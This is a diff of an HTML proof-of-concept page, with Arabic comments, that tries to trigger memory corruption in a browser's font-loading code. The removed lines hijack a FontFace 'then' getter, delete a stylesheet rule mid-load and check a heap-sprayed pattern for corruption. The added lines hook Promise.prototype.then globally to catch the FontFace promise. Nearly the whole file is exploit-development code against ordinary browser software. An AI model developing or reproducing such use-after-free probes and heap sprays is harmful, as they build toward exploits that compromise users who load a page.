@@ -6,40 +6,31 @@
     </style>
 </head>
 <body>
-    <div id="debug" style="color:blue; font-family:monospace;">Status: Probing Memory...</div>
+    <div id="debug" style="color:blue; font-family:monospace;">Status: Attaching Global Hook...</div>
     <script>
         const debug = document.getElementById('debug');
         
+        // محاولة اعتراض الـ Promise.prototype.then عالمياً
+        const originalThen = Promise.prototype.then;
+        
+        Promise.prototype.then = function(onFulfilled, onRejected) {
+            // كشف أي promise يتم استدعاؤه
+            if (this.constructor.name === 'FontFace') {
+                debug.innerText = "!! Global Hook Captured FontFace Promise !!";
+            }
+            return originalThen.call(this, onFulfilled, onRejected);
+        };
+
         window.onload = () => {
             let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
             document.fonts.add(A);
             
-            let fired = false;
-            Object.defineProperty(FontFace.prototype, 'then', {
-                configurable: true,
-                get() {
-                    if (!fired && this === A) {
-                        fired = true;
-                        
-                        // تخصيص "نمط" (Pattern)
-                        const PATTERN = 0x42424242;
-                        let spray = new Uint32Array(100).fill(PATTERN);
-                        
-                        document.getElementById('s').sheet.deleteRule(0);
-                        document.body.offsetTop;
-                        
-                        // التحقق: هل لا يزال النمط كما هو أم تغير؟
-                        if (spray[5] !== PATTERN) {
-                            debug.innerText = "!! SUCCESS: Memory Control Verified. Pattern changed to: " + spray[5].toString(16);
-                        } else {
-                            debug.innerText = "Status: No corruption yet. Need to refine 'Spray' timing.";
-                        }
-                    }
-                    return undefined;
-                }
+            // Trigger
+            document.fonts.load('1em x', 'AB').then(() => {
+                 debug.innerText += "\n(Load resolved)";
+            }).catch(() => {
+                 debug.innerText += "\n(Load rejected)";
             });
-
-            document.fonts.load('1em x', 'AB').catch(() => {});
         };
     </script>
 </body>
